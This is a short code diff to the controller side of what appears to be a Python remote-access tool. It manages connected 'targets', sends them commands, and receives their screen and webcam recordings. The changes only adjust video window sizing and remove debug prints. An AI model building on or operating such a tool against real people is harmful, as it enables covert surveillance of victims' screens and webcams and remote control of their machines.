@@ -16,6 +16,7 @@ import subprocess
 import cv2
 import os
 import pyautogui
+import platform
 
 
 NUMBER_OF_THREADS=2 # constant storing number of threads required in our program
@@ -172,12 +173,18 @@ def get_target(cmd):
 # to display recording
 def show_video(filepath):
 	vid=cv2.VideoCapture(filepath)
-	SCREEN_SIZE=pyautogui.size()
 	window_name=""
+	SCREEN_SIZE=None
 	if filepath == 'screen.avi':
 		window_name="LiveScreen"
+		SCREEN_SIZE=pyautogui.size()
 	elif filepath == "webcam2.avi":
 		window_name="WebcamFeed"
+		vid2=cv2.VideoCapture(0,cv2.CAP_DSHOW)
+		width = int(vid2.get(cv2.CAP_PROP_FRAME_WIDTH))
+		height = int(vid2.get(cv2.CAP_PROP_FRAME_HEIGHT))
+		SCREEN_SIZE=(width,height)
+		vid2.release()
 	cv2.namedWindow(window_name,cv2.WINDOW_NORMAL)
 	cv2.resizeWindow(window_name,SCREEN_SIZE[0],SCREEN_SIZE[1])
 	while vid.isOpened():
@@ -218,7 +225,6 @@ def screenCapture(conn):
 def webcamCapture(conn):
 	print("capturing..")
 	l=int(conn.recv(20480).decode())
-	print(l)
 	conn.send("start".encode())
 	f=open("webcam2.avi","wb")
 	curr_len=0
@@ -310,7 +316,6 @@ def send_target_commands(conn):
 
 			print(client_response,end="") #print client response and end="" is used so that next command begins from new line in terminal
 		except Exception as e:
-			print(e)
 			print("Error sending commands!!")
 
 #Thread Flow
